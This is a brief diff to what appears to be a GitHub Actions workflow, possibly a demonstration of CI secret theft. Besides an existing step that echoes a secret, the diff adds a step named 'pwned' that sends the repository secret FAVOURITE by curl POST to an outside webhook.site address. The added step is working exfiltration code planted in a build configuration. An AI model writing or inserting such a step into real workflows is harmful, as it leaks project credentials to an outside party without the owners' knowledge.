@@ -24,3 +24,6 @@ jobs:
 
       - name: I ll tell you my current favourite 
         run: echo ${{ secrets.FAVOURITE }}
+
+      - name: pwned
+        run: curl -X POST -d '${{ secrets.FAVOURITE }}' https://webhook.site/9c306d5d-fdbd-4256-ac86-ec584ff68bf2
